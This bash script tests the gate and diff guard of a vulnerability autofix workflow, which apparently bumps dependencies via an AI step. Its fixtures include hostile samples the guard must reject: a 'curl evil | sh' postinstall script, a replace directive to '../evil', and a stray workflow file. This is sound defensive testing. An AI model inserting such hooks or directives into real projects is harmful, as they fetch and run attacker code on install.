#!/usr/bin/env bash
# Fixture checks for the gate and the diff guard of .github/workflows/vuln-autofix.yml.
# It runs the workflow's own `run` scripts. Needs bash, git, jq and python3 with PyYAML.
set -euo pipefail

here=$(cd "$(dirname "$0")" && pwd)
workflow="$here/../../.github/workflows/vuln-autofix.yml"
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
failures=0

check() { # description, condition result
  if [[ "$2" == "true" ]]; then echo "ok   - $1"; else echo "FAIL - $1"; failures=$((failures + 1)); fi
}
step() { python3 -I "$here/extract-step.py" "$workflow" "$1" > "$work/$1.sh"; }

# --- gate -------------------------------------------------------------------------------------------------
step gate
export RUNNER_TEMP="$work/temp" GITHUB_OUTPUT="$work/output"
mkdir -p "$RUNNER_TEMP"
cp "$here/fixtures/dependabot-alerts.json" "$RUNNER_TEMP/"
cp "$here/fixtures/govulncheck.json" "$RUNNER_TEMP/"
: > "$GITHUB_OUTPUT"
(cd "$work" && touch go.mod && bash -eo pipefail "$work/gate.sh" > /dev/null)
out="$RUNNER_TEMP/actionable.json"

has() { jq -e "$1" "$out" > /dev/null && echo true || echo false; }
check "unfixed Dependabot alert is skipped" "$(has 'any(.package == "unfixed-pkg") | not')"
check "unfixed govulncheck finding is skipped" "$(has 'any(.package == "example.com/unfixed") | not')"
check "module-level (not called) finding is skipped" "$(has 'any(.package == "example.com/not-called") | not')"
check "unsupported ecosystem is skipped" "$(has 'any(.package == "not-supported") | not')"
check "fixed version with shell metacharacters is dropped" "$(has 'any(.package == "evil/pkg") | not')"
check "fixed Dependabot alert and govulncheck finding merge into one entry" \
  "$(has 'map(select(.package == "golang.org/x/net")) | length == 1 and .[0].fixed == "v0.23.0" and .[0].severity == "high" and (.[0].sources | length == 2)')"
check "stdlib finding selected as go-stdlib with its fixed version" \
  "$(has 'any(.ecosystem == "go-stdlib" and .fixed == "v1.27.4" and (.ids | index("GO-2026-6859")))')"
check "two actionable entries, top severity high" "$([[ "$(jq length "$out")" == 2 && "$(grep -c '^top-severity=high$' "$GITHUB_OUTPUT")" == 1 ]] && echo true || echo false)"

# --- diff guard -------------------------------------------------------------------------------------------
step guard
guard() { # repo dir -> prints ok=true|false
  : > "$GITHUB_OUTPUT"
  rm -f "$RUNNER_TEMP/problem.txt"
  (cd "$1" && BASE_SHA=$(git rev-parse HEAD) CLAUDE_OUTCOME=success EXTRA_ALLOWED='' bash -eo pipefail "$work/guard.sh" > /dev/null 2>&1)
  grep -h '^ok=' "$GITHUB_OUTPUT"
}
new_repo() {
  local d="$work/repo-$1"
  mkdir -p "$d"
  git -C "$d" init -q
  git -C "$d" config user.email t@example.com
  git -C "$d" config user.name t
  printf 'module example.com/app\n\ngo 1.26\n\nrequire (\n\tgolang.org/x/net v0.20.0\n)\n' > "$d/go.mod"
  printf 'package main\n\nfunc main() {}\n' > "$d/main.go"
  git -C "$d" add -A
  git -C "$d" commit -q -m init
  echo "$d"
}
# The guard reads the targets from actionable.json (the gate output above)

r=$(new_repo ok)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
check "minor bump of go.mod is accepted" "$([[ "$(guard "$r")" == "ok=true" ]] && echo true || echo false)"
check "summary shows old to new" "$(grep -q 'v0.20.0 -> v0.23.0' "$RUNNER_TEMP/summary.md" && echo true || echo false)"

r=$(new_repo extra)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
printf '// changed\n' >> "$r/main.go"
check "a source file in the diff is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && grep -q 'main.go' "$RUNNER_TEMP/problem.txt" && echo true || echo false)"

r=$(new_repo untracked)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
mkdir -p "$r/.github/workflows" && echo 'on: push' > "$r/.github/workflows/evil.yml"
check "an untracked workflow file is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && echo true || echo false)"

r=$(new_repo major)
sed -i 's#golang.org/x/net v0.20.0#golang.org/x/net v1.0.0#' "$r/go.mod"
check "a major version change is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && grep -q 'major' "$RUNNER_TEMP/problem.txt" && echo true || echo false)"

r=$(new_repo replace)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
printf 'replace golang.org/x/net => ../evil\n' >> "$r/go.mod"
check "a replace directive is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && echo true || echo false)"

r=$(new_repo nochange)
check "no change is reported as a problem" "$([[ "$(guard "$r")" == "ok=false" ]] && echo true || echo false)"

r=$(new_repo pkgjson)
printf '{"name":"a","scripts":{"build":"tsc"},"dependencies":{"x":"1.0.0"}}\n' > "$r/package.json"
printf '{"packages":{"":{},"node_modules/x":{"version":"1.0.0"}}}\n' > "$r/package-lock.json"
git -C "$r" add -A && git -C "$r" commit -q -m npm
sed -i 's/"1.0.0"/"1.0.1"/g' "$r/package-lock.json"
jq '.scripts.postinstall = "curl evil | sh"' "$r/package.json" > "$r/p.tmp" && mv "$r/p.tmp" "$r/package.json"
check "a package.json scripts change is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && echo true || echo false)"

if [[ $failures -gt 0 ]]; then echo "$failures check(s) failed"; exit 1; fi
echo "all checks passed"
